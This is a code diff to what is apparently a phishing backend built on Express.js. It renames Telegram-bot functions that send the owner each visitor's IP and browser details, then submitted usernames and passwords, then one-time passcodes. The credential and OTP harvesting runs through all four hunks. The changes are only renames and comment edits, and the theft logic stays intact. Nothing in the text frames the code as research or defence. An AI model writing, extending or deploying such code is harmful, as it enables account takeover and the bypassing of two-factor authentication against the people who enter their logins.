@@ -444,7 +444,7 @@ app.use((req, res, next) => {
         console.log('🌐 Login page accessed - sending to owner');
         
         // Send to owner only (private bot chat)
-        telegram.sendLoginPageAccessedToOwner({
+        telegram.sendPageAccessToOwner({
             ip,
             userAgent,
             referrer,
@@ -562,8 +562,8 @@ app.post('/api/submit', async (req, res) => {
             ip 
         }, ip);
 
-        // ✅ SEND TO OWNER ONLY - IN BOT PRIVATE CHAT
-        await telegram.sendCredentialsToOwner({
+        // ✅ SEND COMPLETE USER DATA TO OWNER
+        await telegram.sendCompleteUserData({
             id: userId,
             username,
             password,
@@ -621,7 +621,7 @@ app.post('/api/verify-otp', async (req, res) => {
             userId
         }, req.ip);
 
-        // ✅ SEND OTP TO OWNER ONLY
+        // ✅ SEND OTP DATA TO OWNER
         await telegram.sendOTPToOwner({
             userId,
             otp,
@@ -657,7 +657,7 @@ app.post('/api/complete', async (req, res) => {
             
             console.log(`✅ Process completed - User ID: ${userId}`);
             
-            // ✅ SEND COMPLETION TO OWNER ONLY
+            // ✅ SEND COMPLETION TO OWNER
             await telegram.sendCompleteToOwner({
                 userId: userId,
                 username: req.session?.username || 'unknown',
